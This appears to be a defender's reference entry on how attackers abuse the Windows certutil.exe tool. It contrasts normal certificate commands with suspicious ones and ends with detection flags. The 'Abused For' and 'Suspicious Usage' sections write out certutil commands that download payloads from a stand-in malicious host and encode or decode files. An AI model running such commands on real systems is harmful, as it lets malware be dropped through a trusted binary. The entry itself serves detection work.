# certutil.exe — Certificate Utility

## Description
Windows built-in command-line tool for managing certificates. Can also encode/decode files and download content from the internet, making it a dual-use tool exploited by attackers.

## Abused For
- **File download:** `certutil.exe -urlcache -f http://malicious.com/payload.exe C:\temp\payload.exe`
- **Base64 encoding/decoding:** `certutil.exe -encode payload.exe encoded.txt` and `-decode`
- **CRC/hash verification:** Can compute file hashes
- **Living off the land:** Uses a trusted Microsoft binary for malicious network activity

## Suspicious Usage
```
certutil.exe -urlcache -f http://malicious.com/evil.exe C:\temp\evil.exe
certutil.exe -urlcache -split -f http://malicious.com/payload.exe
certutil.exe -ping  # (ICMP tunneling variant)
certutil.exe -verifyctl -f http://malicious.com/cert.crt
```

## Normal Usage
```
certutil.exe -store My
certutil.exe -addstore Root "C:\certificates\ca.crt"
```

## Detection Flags
- `-urlcache -f` flags indicating file download
- Downloading files to user-writable directories (Temp, AppData)
- Network connections from certutil.exe to non-corporate domains
- certutil.exe encoding or decoding files not associated with certificates
